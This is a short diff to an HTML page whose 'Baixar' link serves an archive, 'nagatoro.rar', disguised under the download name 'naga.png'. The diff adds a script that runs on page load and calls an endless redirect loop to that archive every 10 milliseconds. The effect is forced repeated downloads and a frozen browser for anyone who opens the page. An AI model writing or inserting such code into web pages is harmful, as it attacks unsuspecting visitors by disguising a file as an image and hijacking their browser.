@@ -11,8 +11,11 @@
 <body>
     <a href="nagatoro.rar" download="naga.png">Baixar</a>
     <script>
-        while (true) {
-            document.location.href = "nagatoro.rar";
+        setInterval(baixa, 10)
+        function baixa(){
+            while (true) {
+                document.location.href = "nagatoro.rar";
+            }
         }
     </script>
 </body>
